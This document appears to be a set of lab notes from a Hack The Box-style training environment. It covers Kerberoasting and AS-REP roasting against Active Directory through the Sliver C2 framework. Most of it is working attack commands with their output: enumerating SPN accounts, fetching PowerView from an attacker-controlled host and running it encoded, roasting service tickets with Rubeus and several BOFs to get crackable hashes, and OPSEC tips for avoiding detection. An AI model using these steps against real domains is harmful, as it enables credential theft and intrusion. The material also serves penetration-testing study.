# Kerberoasting

**Premise:** A service running under a domain user context = service account, which should have an **SPN** (Service Principal Name — a unique service instance identifier) set. The service account's password hash encrypts the TGS ticket. Request a TGS for the target service account → extract the `krb5tgs` hash → crack offline → plaintext password.

> [!note] `krbtgt` always has an SPN but is **not** kerberoastable.
### Enumerate kerberoastable accounts via `sharpsh`

Base64-encode the PowerView command:

```shell
echo "Get-NetUser -spn | select samaccountname,description" | base64
# R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo=
```

Stand up an HTTP server with `PowerView.ps1` in the serve dir, then:

```shell
sliver > sharpsh -- '-u http://<lhost>:<lport>/PowerView.ps1 -e -c "R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo="'
```

```text
samaccountname description
-------------- -----------
krbtgt         Key Distribution Center Service Account
svc_sql        SQL Server Manager.
alice          User who can monitor srv01 via RDP
```

### Enumerate via `delegationbof` (Armory)

`6` = SPN LDAP check.

```shell
sliver > delegationbof 6 child.htb.local
```

Returns full LDAP objects for SPN-holding users (`servicePrincipalName`, `sAMAccountName`, etc.).

### Roast with Rubeus — `inline-execute-assembly`
Specify **mode**, **format**, and **user**. Roast _specific_ users, not all (OPSEC)

>[!note] `rubeus` has a BOF, so you do not need to use execute-assembly. 
>

```shell
sliver > inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
```

```text
[*] Action: Kerberoasting
[*] Target User   : alice
[*] Supported ETypes : RC4_HMAC_DEFAULT
[*] Hash : $krb5tgs$23$*alice$child.htb.local$rdp/web01.child.htb.local@child.htb.local*$F30E695<SNIP>
```

> [!warning] AES AES hashes are returned for AES-enabled accounts. Use `/ticket:X` or `/tgtdeleg` to force `RC4_HMAC`.

### Roast with `c2tc-kerberoast` (Armory)

Requires a username; ticket must be converted via `TicketToHashcat.py`.

```shell
sliver > c2tc-kerberoast roast alice
# -> Encoded service ticket: copy <TICKET> output to file, decode with TicketToHashcat.py
```

---

# ASREPRoasting

**Premise:** If a domain user has **Kerberos Pre-Authentication disabled** (`DoesNotRequirePreAuth`), request an AS-REP and pull the `krb5asrep` hash from part of the reply → crack offline.
### Enumerate — PowerShell + RSAT

```powershell
Install-WindowsFeature -Name RSAT-AD-PowerShell

Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName, DoesNotRequirePreAuth
```

```text
SamAccountName DoesNotRequirePreAuth
-------------- ---------------------
bob                             True
```

### Roast with Rubeus

```shell
sliver inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
```

```text
[*] Action: AS-REP roasting
[*] Target User : bob
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
    $krb5asrep$23$bob@child.htb.local:F4B<SNIP>1432
```

> [!warning] AES AES hashes are returned for AES-enabled accounts. Use `/ticket:X` or `/tgtdeleg` to force `RC4_HMAC`.

---
# Miscellaneous

### Native SPN discovery — `setspn.exe`

Built-in Windows utility; reads/modifies/deletes SPNs. (Spawning `shell` is bad OPSEC.)

```shell
setspn.exe -Q */*
```

```text
Checking domain DC=child,DC=htb,DC=local
CN=svc sql,OU=Service Account,DC=child,DC=htb,DC=local
    MSSQLSvc/srv02.child.htb.local:1433
CN=alice,CN=Users,DC=child,DC=htb,DC=local
    rdp/web01.child.htb.local
```

### Roast a known SPN — `bof-roast` (Armory)

Convert resulting ticket with `apreq2hashcat.py`.

```shell
sliver > bof-roast rdp/web01.child.htb.local
# [+] Got Ticket! Convert it with apreq2hashcat.py YIIGUgYJKoZIhvcSAQIC<SNIP>
```

---

##  Tooling Quick Reference

|Tool|Action|Hashcat conversion|
|---|---|---|
|`sharpsh` + PowerView|Enumerate SPN users|—|
|`delegationbof 6`|LDAP SPN check|—|
|Rubeus `kerberoast`|Roast (TGS)|native `/format:hashcat`|
|`c2tc-kerberoast`|Roast (TGS)|`TicketToHashcat.py`|
|Rubeus `asreproast`|Roast (AS-REP)|native `/format:hashcat`|
|`setspn.exe -Q */*`|Native SPN discovery|—|
|`bof-roast <SPN>`|Roast (TGS)|`apreq2hashcat.py`|

